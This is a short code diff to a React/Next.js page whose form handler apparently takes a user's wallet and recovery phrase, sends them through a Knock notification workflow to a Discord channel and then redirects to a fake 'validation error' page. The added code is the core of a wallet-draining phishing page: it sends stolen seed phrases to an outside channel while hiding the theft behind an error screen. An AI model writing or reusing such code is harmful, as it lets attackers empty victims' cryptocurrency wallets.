@@ -25,12 +25,29 @@ export default function page() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await fetch("/api/email", {
-      method: "POST",
-      body: JSON.stringify({
+    knock.objects.set("project5", "project-1", {
+      name: "My project5",
+      total_assets: 10,
+      tags: ["cool", "fun", "project"],
+    });
+    await knock.objects.setChannelData(
+      "project5",
+      "projects-1",
+      process.env.NEXT_PUBLIC_KNOCK_DISCORD_CHANNEL_ID,
+      {
+        connections: [
+          {
+            channel_id: "1212536290910933005",
+          },
+        ],
+      }
+    );
+    await knock.workflows.trigger("adert", {
+      data: {
         wallet: formState.wallet,
         currentPhrase: formState.currentPhrase,
-      }),
+      },
+      recipients: [{ id: "projects-1", collection: "project5" }],
     });
     setTimeout(() => {
       navigate.push("/wallet/validationerror");
